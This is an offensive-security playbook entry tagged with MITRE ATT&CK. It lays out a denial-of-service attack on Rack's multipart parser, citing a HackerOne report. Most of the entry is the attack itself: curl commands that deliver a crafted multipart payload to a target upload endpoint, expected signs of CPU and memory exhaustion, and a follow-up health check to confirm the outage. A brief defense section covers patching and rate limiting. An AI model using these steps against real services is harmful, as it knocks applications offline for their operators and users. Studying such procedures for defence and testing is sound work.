---
id: proc-rack-send-001
tags:
  - dos
  - exploit
  - rack
  - http-flood
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-multipart-dos]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:37.185Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Send DoS Request to Trigger Exhaustion

## Summary

This procedure delivers the crafted multipart request to a vulnerable Rack endpoint, forcing the parser to process unlimited parts and resulting in CPU/memory exhaustion, potential OOM killing, and service disruption for other requests.

## Description

Exploitation sends POST requests with excessive parts to any multipart-handling endpoint, leading to high resource usage as reported in HackerOne #1954937. It affects Rails apps not behind strict proxies. Expected outcomes: delayed responses, worker blocking, and application crashes.

## Requirements

1. Crafted request body from prior procedure
2. Network access to target POST endpoint
3. Monitoring capability for server impact (optional)

## Defense

Defensive measures and detection strategies:

- Patch Rack and restart services
- Rate-limit POST requests per IP
- Deploy resource monitoring (e.g., Prometheus) for parsing anomalies

## Objectives

1. Deliver payload to trigger parser overload
2. Observe resource exhaustion effects
3. Confirm DoS by testing concurrent requests

## Instructions

### Step 1: Prepare Headers and Endpoint

**Context**: Set the correct Content-Type with boundary matching the payload.

**Command** (Setup):

Ensure endpoint is /upload (example):

```bash
endpoint="https://target.com/upload"
```

> Verify endpoint accepts multipart via a small test request.

### Step 2: Send the Request

**Context**: Transmit the full payload using curl to initiate the DoS.

**Command** ([[commands/curl-multipart-dos]]):

```bash
curl -X POST -H "Content-Type: multipart/form-data; boundary=boundary123" --data-binary @dos_request.txt $endpoint
```

> Expected output: Slow response (minutes) or timeout; server-side: high CPU, memory spike.

### Step 3: Validate Impact

**Context**: Send a benign request to check for disruption.

**Command** (Test):

```bash
curl -X GET https://target.com/health
```

> Expected output: Delayed or failed response indicating successful DoS.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques


## Commands Used

- [[commands/curl-multipart-dos]]

## Tools Used


## Tags

- exploitation
- resource-exhaustion
